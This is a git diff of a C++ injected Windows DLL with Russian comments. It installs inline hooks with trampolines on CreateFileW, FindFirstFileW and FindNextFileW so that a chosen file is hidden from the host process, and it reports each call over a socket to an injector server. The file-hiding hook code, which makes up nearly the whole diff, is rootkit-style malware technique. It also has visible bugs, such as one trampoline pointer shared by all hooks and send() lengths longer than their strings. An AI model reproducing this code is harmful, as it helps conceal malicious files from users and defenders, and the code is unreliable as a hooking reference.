@@ -1,25 +1,30 @@
 ﻿// dllmain.cpp : Определяет точку входа для приложения DLL.
-#include "framework.h"
-#include <stdio.h>
-#define MAGIC 14
 
 
 
 #define WIN32_LEAN_AND_MEAN
-
+#include "framework.h"
 #include <windows.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <stdlib.h>
 #include <stdio.h>
+#include <iostream>
+#include <chrono>
+#include <ctime>
+#include <format>
+#include <string>
+#include <thread>
 
 // Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
 #pragma comment (lib, "Ws2_32.lib")
 #pragma comment (lib, "Mswsock.lib")
 #pragma comment (lib, "AdvApi32.lib")
-
+#define MAGIC 14
 #define DEFAULT_BUFLEN 512
 #define DEFAULT_PORT "27015"
+
+using namespace std;
 
 char func_name[256] = "";
 char file_name[256] = "";
@@ -41,6 +46,8 @@ BYTE bytesNext[14] = {
     0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, // JMP [RIP+0]
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 // Сюда ляжет 64-битный адрес
 };
+
+void* pOriginalWithTrampoline;
 
 wchar_t* convertCharArrayToLPCWSTR(const char* charArray)
 {
@@ -138,50 +145,116 @@ int connect_to_server()
 
 }
 
+size_t GetInstructionLength(BYTE* address, size_t minSize) {
+    size_t offset = 0;
+
+    while (offset < minSize) {
+        BYTE* cur = address + offset;
+
+        // --- Инструкции с REX префиксом (0x48 или 0x4C) ---
+        if (cur[0] == 0x48 || cur[0] == 0x4C || cur[0] == 0x41) {
+            // mov rax, rsp (48 8B C4) или push r14 (41 56)
+            if (cur[1] == 0x8B || cur[1] == 0x89) {
+                // Если есть смещение (как [rax+08]), это 4 байта, если нет (как c4) - 3 байта
+                if (cur[2] >= 0x40 && cur[2] <= 0x7F) offset += 4; // со смещением 1 байт
+                else offset += 3;
+            }
+            else if (cur[1] >= 0x50 && cur[1] <= 0x5F) offset += 2; // push/pop r8-r15
+            else if (cur[1] == 0x83) offset += 4; // sub rsp, xx
+            else offset += 3; // дефолт для REX
+        }
+        // --- Однобайтовые инструкции ---
+        else if (cur[0] >= 0x50 && cur[0] <= 0x5F) { // push/pop (rax-rdi)
+            offset += 1;
+        }
+        else if (cur[0] == 0xCC) { // int 3 
+            offset += 1;
+        }
+        // --- Двубайтовые (например, короткие переходы или mov) ---
+        else if (cur[0] == 0x8B || cur[0] == 0x89) {
+            offset += 2;
+        }
+        else if (cur[0] == 0xE9) { // jmp rel32
+            offset += 5;
+        }
+        else {
+            // Если совсем непонятно, идем по 1 байту
+            // В идеале тут нужен полноценный дизассемблер, но для прологов этого хватит
+            offset += 1;
+        }
+    }
+    return offset;
+}
+
+
+
+/*
+void* CreateTrampoline(void* const targetAddress, const size_t size) {
+
+    //const auto jumpBack{ CreateJumpBytes(reinterpret_cast<unsigned char*>(targetAddress) + size) };
+    const auto jumpBack = { 0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
+
+    const auto trampolineStub{ VirtualAlloc(nullptr, size + jumpBack.size(),
+        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE) };
+    if (trampolineStub == nullptr) {
+        send(ConnectSocket, "Error: VirtualAlloc", 50, 0);
+    }
+
+    std::memcpy(trampolineStub, targetAddress, size);
+    std::memcpy(&reinterpret_cast<unsigned char*>(trampolineStub)[size],
+        jumpBack.data(), jumpBack.size());
+
+    return trampolineStub;
+}
+*/
+void* CreateTrampoline(void* targetAddress, int size) {
+    // 1. Вычисляем адрес, куда трамплин должен прыгнуть обратно (адрес оригинала + смещение)
+    void* returnAddress = (unsigned char*)targetAddress + size;
+
+    // 2. Наш массив-шаблон
+    BYTE jumpBack[14] = {
+        0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+    };
+
+    // 3. Записываем адрес возврата в массив (с 6-го байта)
+    memcpy(&jumpBack[6], &returnAddress, sizeof(void*));
+
+    // 4. Выделяем память под трамплин (разрядность инструкций + наш прыжок)
+    void* trampolineStub = VirtualAlloc(nullptr, size + 14, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    // 5. Копируем "голову" оригинальной функции
+    memcpy(trampolineStub, targetAddress, size);
+
+    // 6. Дописываем наш прыжок в конец трамплина
+    memcpy((unsigned char*)trampolineStub + size, jumpBack, 14);
+
+    return trampolineStub;
+}
+
+typedef HANDLE(WINAPI* CreateFileW_t)(
+    LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES,
+    DWORD, DWORD, HANDLE
+    );
 HANDLE MyCreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode,
     LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition,
     DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) {
 
-    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
-    void* FuncAddr = (void*)GetProcAddress(hKernel32, "CreateFileW");
-
-    // 1. ОТПРАВЛЯЕМ ДАННЫЕ О ТОМ, ЧТО ФУНКЦИЯ ВЫЗВАНА
     char notification[] = "Called function: CreateFileW\n";
     send(ConnectSocket, notification, strlen(notification) + 1, 0);
-
     // 2. СКРЫВАЕМ ФАЙЛ ЕСЛИ НАДО
     LPCWSTR FileToHide = convertCharArrayToLPCWSTR(file_name);
     if (wcsstr(lpFileName, FileToHide)) {
         SetLastError(ERROR_FILE_NOT_FOUND);
         return INVALID_HANDLE_VALUE; // Процесс думает, что файла нет
     }
-
-    // 3 ВЫЗОВ ОРИГИНАЛА
-    // начало оригинальной функции затерто нашими 14 байтами JMP
-    // надо: Снять хук -> Вызвать оригинал -> Вернуть хук
-
-    DWORD oldProtect;
-
-    // 3.1 Снимаем наш хук (возвращаем родные 14 байт)
-    VirtualProtect(FuncAddr, MAGIC, PAGE_EXECUTE_READWRITE, &oldProtect);
-    memcpy(FuncAddr, CreateOrigBytes, MAGIC);
-
-    // 3.2 Вызываем настоящую CreateFileW
-    HANDLE result = CreateFileW(lpFileName, dwDesiredAccess, dwShareMode,
+    return ((CreateFileW_t)pOriginalWithTrampoline)(lpFileName, dwDesiredAccess, dwShareMode,
         lpSecurityAttributes, dwCreationDisposition,
         dwFlagsAndAttributes, hTemplateFile);
-
-    // 3.3 Ставим хук обратно (возвращаем JMP)
-    memcpy(FuncAddr, bytesCreate, MAGIC);
-    VirtualProtect(FuncAddr, MAGIC, oldProtect, &oldProtect);
-
-    return result;
 }
 
+typedef HANDLE(WINAPI* FindFirstFileW_t)(LPCWSTR, LPWIN32_FIND_DATAW);
 HANDLE MyFindFirstFileW(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData) {
-
-    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
-    void* FuncAddr = (void*)GetProcAddress(hKernel32, "FindFirstFileW");
 
     // 1. ОТПРАВЛЯЕМ ДАННЫЕ О ТОМ, ЧТО ФУНКЦИЯ ВЫЗВАНА
     char notification[] = "Called function: FindFirstFileW\n";
@@ -194,62 +267,125 @@ HANDLE MyFindFirstFileW(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData) {
         return INVALID_HANDLE_VALUE; // Процесс думает, что файла нет
     }
 
-    // 3 ВЫЗОВ ОРИГИНАЛА
-    // начало оригинальной функции затерто нашими 14 байтами JMP
-    // надо: Снять хук -> Вызвать оригинал -> Вернуть хук
-
-    DWORD oldProtect;
-
-    // 3.1 Снимаем наш хук (возвращаем родные 14 байт)
-    VirtualProtect(FuncAddr, MAGIC, PAGE_EXECUTE_READWRITE, &oldProtect);
-    memcpy(FuncAddr, FirstOrigBytes, MAGIC);
-
-    // 3.2 Вызываем настоящую CreateFileW
-    HANDLE result = FindFirstFileW(lpFileName, lpFindFileData);
-
-    // 3.3 Ставим хук обратно (возвращаем JMP)
-    memcpy(FuncAddr, bytesFirst, MAGIC);
-    VirtualProtect(FuncAddr, MAGIC, oldProtect, &oldProtect);
-
-    return result;
+    return ((FindFirstFileW_t)pOriginalWithTrampoline)(lpFileName, lpFindFileData);
 }
 
+typedef HANDLE(WINAPI* FindNextFileW_t)(HANDLE, LPWIN32_FIND_DATAW);
 BOOL WINAPI MyFindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData) {
+    // 1. Логируем вызов
+    send(ConnectSocket, "Called function: FindNextFileW\n", 31, 0);
 
-    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
-    void* FuncAddr = (void*)GetProcAddress(hKernel32, "FindNextFileW");
+    // 2. Вызываем оригинал ЧЕРЕЗ ТРАМПЛИН (хук снимать не нужно!)
+    BOOL result = (BOOL)((FindNextFileW_t)pOriginalWithTrampoline)(hFindFile, lpFindFileData);
 
-    char notification[] = "Called function: FindNextFileW\n";
-    send(ConnectSocket, notification, strlen(notification) + 1, 0);
-
-    // 1 Снимаем хук, чтобы вызвать настоящую функцию
-    DWORD oldProtect;
-    VirtualProtect(FuncAddr, MAGIC, PAGE_EXECUTE_READWRITE, &oldProtect);
-    memcpy(FuncAddr, NextOrigBytes, MAGIC);
-
-    // 2 Вызываем оригинал (система записывает имя файла в lpFindFileData)
-    BOOL result = FindNextFileW(hFindFile, lpFindFileData);
-
-    // 3 Проверяем: это тот самый файл, который надо скрыть
+    // 3. Проверяем имя файла
     wchar_t* target = convertCharArrayToLPCWSTR(file_name);
 
-    if (result && wcsstr(lpFindFileData->cFileName, target)) {
-        // 4. Если это "скрытый" файл — вызываем функцию ЕЩЕ РАЗ
-        // Теперь система запишет в lpFindFileData уже СЛЕДУЮЩИЙ файл в папке
-        result = FindNextFileW(hFindFile, lpFindFileData);
+    // Используем цикл while вместо if. 
+    // Это нужно на случай, если в папке лежат ДВА скрываемых файла подряд.
+    while (result && wcsstr(lpFindFileData->cFileName, target)) {
+        send(ConnectSocket, "File hidden!\n", 14, 0);
 
-        // Отправляем лог в инжектор
-        send(ConnectSocket, "File hidden!\n", 15, 0);
+        // Снова вызываем оригинал через трамплин, чтобы получить СЛЕДУЮЩИЙ файл
+        result = (BOOL)((FindNextFileW_t)pOriginalWithTrampoline)(hFindFile, lpFindFileData);
     }
 
-    // 5. Ставим хук обратно и возвращаем результат
-    memcpy(FuncAddr, bytesNext, MAGIC);
-    VirtualProtect(FuncAddr, MAGIC, oldProtect, &oldProtect);
-
+    delete[] target; // Не забываем чистить память за convertCharArrayToLPCWSTR
     return result;
 }
 
 
+// 1 Объявляем внешнюю функцию из .asm
+extern "C" void callLogger();
+
+// 2 Объявляем переменные, которые ждет .asm 
+extern "C" void* hookPtr = nullptr; // адрес трамплина
+
+// 3 функция-логгер на C++
+extern "C" void Logger() {
+    send(ConnectSocket, "Generic function call detected!\n", 40, 0);
+}
+// 4. В InstallHook подставляем callLogger вместо MyCreateFileW
+int InstallHookGeneric(const char* funcName) {
+    DWORD oldProtect;
+    HMODULE hKernel32 = GetModuleHandle(L"kernelbase.dll");
+    void* FuncAddr = (void*)GetProcAddress(hKernel32, funcName);
+
+    // Создаем трамплин
+    size_t actualSize = GetInstructionLength((BYTE*)FuncAddr, MAGIC);
+    hookPtr = CreateTrampoline(FuncAddr, (int)actualSize);
+
+    // Теперь затираем оригинал прыжком на наш ассемблерный callLogger
+    *(void**)(&bytesCreate[6]) = (void*)callLogger;
+    VirtualProtect(FuncAddr, actualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+    memcpy(FuncAddr, bytesCreate, MAGIC);
+    for (size_t i = MAGIC; i < actualSize; i++) {
+        ((BYTE*)FuncAddr)[i] = 0x90; // NOP
+    }
+    VirtualProtect(FuncAddr, actualSize, oldProtect, &oldProtect);
+    return 0;
+}
+
+int InstallHook(const char func[256]) {
+    HMODULE hKernel32 = GetModuleHandle(L"kernelbase.dll");
+    void* FuncAddr = (void*)GetProcAddress(hKernel32, func);
+    if (!FuncAddr) return 0;
+    DWORD oldProtect;
+
+    if (!strcmp("CreateFileW", func)) {
+        // 1. Считаем, сколько байт НУЖНО забрать, чтобы не разрезать инструкции
+        // Мы затираем 14 байт (MAGIC), значит и искать надо минимум 14!
+        size_t actualSize = GetInstructionLength((BYTE*)FuncAddr, MAGIC);
+
+        // 2. Создаем трамплин на это количество байт
+        pOriginalWithTrampoline = CreateTrampoline(FuncAddr, (int)actualSize);
+
+        // 3. Подготавливаем JMP (он всегда 14 байт)
+        *(void**)(&bytesCreate[6]) = (void*)MyCreateFileW;
+
+        // 4. Разрешаем запись на ВСЮ длину, которую мы затронем (actualSize)
+        VirtualProtect(FuncAddr, actualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+
+        // 5. Затираем начало. 
+        // ВАЖНО: Если actualSize > 14, оставшиеся байты желательно забить NOP (0x90), 
+        // чтобы там не осталось "хвостов" старых инструкций.
+        memcpy(FuncAddr, bytesCreate, MAGIC);
+        for (size_t i = MAGIC; i < actualSize; i++) {
+            ((BYTE*)FuncAddr)[i] = 0x90; // NOP
+        }
+        VirtualProtect(FuncAddr, actualSize, oldProtect, &oldProtect);
+    }
+
+    else if (!strcmp("FindFirstFileW", func)) {
+        size_t actualSize = GetInstructionLength((BYTE*)FuncAddr, MAGIC);
+        pOriginalWithTrampoline = CreateTrampoline(FuncAddr, (int)actualSize);
+        *(void**)(&bytesFirst[6]) = (void*)MyFindFirstFileW;
+        VirtualProtect(FuncAddr, actualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+        memcpy(FuncAddr, bytesFirst, MAGIC);
+        for (size_t i = MAGIC; i < actualSize; i++) {
+            ((BYTE*)FuncAddr)[i] = 0x90; // NOP
+        }
+        VirtualProtect(FuncAddr, actualSize, oldProtect, &oldProtect);
+    }
+    else if (!strcmp("FindNextFileW", func)) {
+        size_t actualSize = GetInstructionLength((BYTE*)FuncAddr, MAGIC);
+        pOriginalWithTrampoline = CreateTrampoline(FuncAddr, (int)actualSize);
+        *(void**)(&bytesNext[6]) = (void*)MyFindNextFileW;
+        VirtualProtect(FuncAddr, actualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+        memcpy(FuncAddr, bytesNext, MAGIC);
+        for (size_t i = MAGIC; i < actualSize; i++) {
+            ((BYTE*)FuncAddr)[i] = 0x90; // NOP
+        }
+        VirtualProtect(FuncAddr, actualSize, oldProtect, &oldProtect);
+    }
+
+
+    
+    return 1;
+}
+
+
+/*
 int InstallHook(const char func[256]) {
 
     HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
@@ -261,6 +397,10 @@ int InstallHook(const char func[256]) {
         FuncAddr = (void*)GetProcAddress(hKernel32, func);
         // сохраняем старые байты
         memcpy(CreateOrigBytes, FuncAddr, MAGIC);
+
+        pOriginalWithTrampoline = CreateTrampoline(FuncAddr, GetInstructionLength((BYTE*)FuncAddr, 12));
+
+
         // подменяем начало функции
         *(void**)(&bytesCreate[6]) = (void*)MyCreateFileW;
         // разрешаем запись в адресное пространство функции
@@ -290,10 +430,9 @@ int InstallHook(const char func[256]) {
         VirtualProtect(FuncAddr, MAGIC, oldProtect, &oldProtect);
     }
 
-
-
     return 1;
 }
+*/
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD  reason, LPVOID lpReserved)
 {
@@ -304,11 +443,13 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  reason, LPVOID lpReserved)
         Sleep(3000);
         connect_to_server();
 
-        InstallHook("CreateFileW");
-        InstallHook("FindFirstFileW");
-        InstallHook("FindNextFileW");
-
-
+        //InstallHook(func_name);
+        //InstallHook("FindFirstFileW");
+        //InstallHook("FindNextFileW");
+        send(ConnectSocket, func_name, strlen(func_name) + 1, 0);
+        InstallHookGeneric(func_name);
+        
+        //InstallHookGeneric("CreateFileW");
 
         /*
         FILE* file2;
